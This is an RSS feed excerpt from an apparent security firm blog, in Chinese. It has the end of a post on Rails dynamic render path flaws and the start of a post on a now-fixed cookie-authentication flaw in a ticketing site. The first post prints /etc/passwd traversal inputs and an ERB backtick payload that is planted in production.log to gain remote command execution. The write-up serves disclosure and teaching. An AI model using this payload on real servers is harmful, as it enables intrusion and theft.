&lt;p&gt;另外建一個 demo 樣板做示意：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/demo.html.erb --&amp;gt;&lt;/span&gt;
This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;實際測試，如果我們連到 WelcomeController 的 index action，不帶任何參數會讀取 index 模版。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_index.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_index.png&quot; alt=&quot;Rails render index view&quot; title=&quot;Rails render index view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果帶參數 page=demo，會讀取到 demo 模版。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_demo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_demo.png&quot; alt=&quot;Rails render demo view&quot; title=&quot;Rails render demo view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;所以，如果我們知道管理介面的模版路徑，送出路徑參數就可以讀取到管理介面。這就是 OWASP 所描述的風險，攻擊者得以讀取任意模版。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_admin.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_admin.png&quot; alt=&quot;Rails render admin view&quot; title=&quot;Rails render admin view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;然而，當我們嘗試送出系統絕對路徑例如 /etc/passwd &lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;，網頁竟然吐出了 /etc/passwd 的內容！這就是之前所述的直接存取物件問題，可以遍歷目錄瀏覽檔案。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot; alt=&quot;Rails render Insecure Direct Object References&quot; title=&quot;Rails render Insecure Direct Object References&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;進階攻擊&quot;&gt;進階攻擊&lt;/h3&gt;

&lt;p&gt;通常在 Rails 環境下能夠讀取任意檔案，攻擊者會優先尋找 secret_token，目的是變造惡意 session cookie 利用 Marshal serialize 的問題做 &lt;a href=&quot;http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/&quot;&gt;RCE&lt;/a&gt;。然而在本案例系統使用了 Rails 4.1 後的版本，Rails 4.1 預設使用了 JSON-based 的 serializer 防止了之前的 RCE 問題，所以並沒有辦法輕鬆利用。&lt;/p&gt;

&lt;p&gt;為了取得系統操作權，我們嘗試尋找其他可利用的地方。在這邊我們發現了該站系統 production.log 中存在 AWS 的上傳紀錄。如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;image/png&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&amp;quot;upload_001&amp;quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;於是我們可以利用上傳檔案的 Content-Type 內容，將 Embedded Ruby 語句 &amp;lt;%=`#{params[:devcore]}`%&amp;gt; 添加到 production.log 檔案裡面。於是 log 的內容變成了下面這樣：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;image/png&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&amp;quot;upload_001&amp;quot;)&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;040211&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;%=`&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:devcore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`%&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&amp;quot;upload_002&amp;quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;接著，我們就可以利用前面的弱點讀取 production.log 檔案，再帶一個 devcore 參數作為指令，如圖，成功取得系統操作權 :p&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_RCE.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_RCE.png&quot; alt=&quot;Rails render Remote Code Execution&quot; title=&quot;Rails render Remote Code Execution&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;風險原因&quot;&gt;風險原因&lt;/h3&gt;

&lt;p&gt;一般來說 Rails 開發並不太會這樣寫，但稍微搜尋一下 Github 還是能發現這種寫法存在一些專案中。我想主要原因多半是開發者想要偷懶，然後也可能想說動態樣板路徑頂多就被看到面板的 html，無傷大雅。誰知道就因為這樣導致整個程式碼內容被讀取。&lt;/p&gt;

&lt;p&gt;若有一個 action 要動態顯示不同模版的需求，為了避免上述的問題，就辛苦點先用 case…when 去判斷吧。這跟不要用字串組 SQL 語句避免 SQL injection 一樣，這種外面傳進來的參數都要謹慎處理的觀念要內化在開發中。&lt;/p&gt;

&lt;p&gt;除了開發者基本上不應該這樣開發外，Rails 本身也有一點點問題，當 render 路徑沒有副檔名，無法判斷什麼格式時，就會直接採用預設的 template handler。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/resolver.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;extract_handler_and_format_and_variant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_formats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shift&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;The file &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; did not specify a template handler. The default is currently ERB, &amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
              &lt;span class=&quot;s2&quot;&gt;&amp;quot;but will change to RAW in the future.&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;ActiveSupport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Deprecation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;warn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler_for_extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EXTENSIONS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:variants&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Types&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;

  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;而這裡預設的 handler 是 ERB（見 register_default_template_handler），所以有本篇後面提到的進階攻擊，可以被利用來 RCE。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/handlers.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;extended&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_default_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:erb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ERB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Builder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Raw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:ruby&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_proc&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;慶幸的是，目前 Rails 已經把預設的 template handler 從 ERB 改成 RAW，不會輕易把要 render 的檔案當成 ERB 執行了。詳細的內容請參考這個 &lt;a href=&quot;https://github.com/rails/rails/commit/4be859f0fdf7b3059a28d03c279f03f5938efc80&quot;&gt;commit&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;Ruby on Rails 能讓開發者較輕鬆的開發出安全的應用程式，然而，若開發者不注意，還是有可能寫出嚴重的漏洞。本文的動態樣板路徑就是這樣一個例子，它不只是 OWASP 所描述的可以存取任意模版而已，它可以遍歷檔案，甚至因為 rails 預設的 template handler 是 ERB，造成遠端命令執行讓攻擊者取得伺服器操作權。&lt;/p&gt;

&lt;p&gt;這個例子又再次驗證，框架可以幫助大家快速開發，增加安全度。但唯有良好的安全意識，才是應用程式安全的基石。&lt;/p&gt;

&lt;h3 id=&quot;註解&quot;&gt;註解&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot;&gt;
      &lt;p&gt;Dynamic Render Paths 目前並沒有中文翻譯，因為問題之精髓在於要產生的樣板路徑是可變動的，因此筆者認為動態樣板路徑這個翻譯較為貼切。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot;&gt;
      &lt;p&gt;筆者測試的環境為 Rails 4.1.4，其他 Rails 版本有可能需要用 ../../../../../etc/passwd 跳脫目前目錄。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails/</link>
                <guid>https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails</guid>
                <pubDate>Fri, 24 Jul 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>談 Cookie 認證安全－以宏碁雲端售票為例</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;Cookie 是開發網頁應用程式很常利用的東西，它是為了解決 HTTP stateless 特性但又需要有互動而產生的。開發者想把什麼資訊暫存在用戶瀏覽器都可以透過 Cookie 來完成，只要資訊量不大於約 4KB 的限制就沒問題。在這樣的空間裡，可以放購物車內的暫存商品、可以儲存讀者閱讀記錄以精準推薦產品、當然也可以寫入一些認證資訊讓使用者能保持登入狀態。&lt;/p&gt;

&lt;p&gt;Cookie 有一些先天上的缺點，在於資料是儲存在瀏覽器端，而使用者是可以任意修改這些資料的。所以如果網站的使用者身分認證資訊依賴 Cookie，偷偷竄改那些認證資訊，也許有機會能夠欺騙網站，盜用他人身分，今天就來談談這樣的一件事情吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;問題與回報&quot;&gt;問題與回報&lt;/h3&gt;

&lt;p&gt;會想要聊這個議題，主要是因為最近很紅的宏碁雲端售票系統就是採用 Cookie 認證。上週在註冊該網站時看了一下 Cookie，發現該網站沒有使用 &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;Session 機制&lt;/a&gt;的跡象，也就是單純利用 Cookie 的值來認證。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/acer_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/acer_cookie.png&quot; alt=&quot;宏碁雲端 cookie&quot; title=&quot;宏碁雲端 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;於是開始好奇認證主要的依據是什麼？從圖中可以看到 Cookie 值並不多，猜測該網站大概會是看 USER_ID、USER_ACCOUNT 來判斷你是哪個使用者，稍作測試後會發現有些頁面只依據 USER_ACCOUNT 的值來確認身分，而 USER_ACCOUNT 這個值其實就是使用者的身分證字號，也就是說任何人只要跟網站說我的身分證字號是什麼，網站就會認為你是那個身分證字號的使用者。利用這點設計上的小瑕疵，就可以竊取他人個資，更進階一點，甚至可以用來清空別人的志願單讓其他使用者買不到票。&lt;/p&gt;

&lt;p&gt;發現這個問題後，決定通報 &lt;a href=&quot;https://vulreport.net/&quot;&gt;VulReport 漏洞回報平台&lt;/a&gt;，由該平台統一通知開發商。這是我第一次使用這個平台，對我而言這是一個方便且對整體資安環境有助益的平台。方便點在於，過去常常困擾於發現一些網站有設計上的疏失卻不知該不該通報，如果認識該網站的開發者倒是還好可以直接講，但對於其他不認識的，一來沒有明確窗口，二來礙於工作關係怕被認為是敲竹槓，所以影響不大的漏洞可能就放水流了。這樣放任其實不是一件健康的事情，漏洞在風險就在，有了這樣的回報平台至少可以告訴企業可能存在風險，自己也可以放心通報。事實上，對岸有&lt;a href=&quot;http://wooyun.org/&quot;&gt;類似的平台&lt;/a&gt;已經行之有年，最顯著的效果，就是對岸網站在 0 day 被揭露後能在一週左右全國修復，而以往可能好多年過去了漏洞還在。這真的能夠加速保護企業和使用者，很高興台灣也有了這樣的平台！&lt;/p&gt;

&lt;p&gt;昨天早上收到了平台回報宏碁雲端售票已經&lt;a href=&quot;https://vulreport.net/vulnerability/detail/284&quot;&gt;修復的消息&lt;/a&gt;，既然已經修復且公開了，就順便講解這個問題的細節吧！希望其他開發者可以從中體會到攻擊者的思維，進而做洽當的防禦。&lt;/p&gt;

&lt;h3 id=&quot;驗證及危害&quot;&gt;驗證及危害&lt;/h3&gt;

&lt;p&gt;為了方便驗證解說這個問題，這邊特別用兩個不存在的身分證字號在宏碁雲端售票申請帳號，分別是 Z288252522 和 Z239398899。測試目的是登入帳號 Z288252522 後看看是否能利用上述 Cookie 問題讀取 Z239398899 的個資。&lt;/p&gt;

&lt;p&gt;首先登入帳號 Z288252522，找到一個會回傳個資的頁面：&lt;br /&gt;&lt;br /&gt;
https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_data.png&quot; alt=&quot;第一個使用者個資&quot; title=&quot;第一個使用者個資&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;此時的 Cookie 值如下&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot; alt=&quot;第一個使用者 cookie&quot; title=&quot;第一個使用者 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從圖中發現 Cookie 的值其實是經過加密的，這點在上面說明攻擊觀念時刻意沒有提及。把 Cookie 值加密是一種防止別人修改 Cookie 值的方式，攻擊者不知道 Cookie 值的內容，自然也無法修改了。&lt;/p&gt;

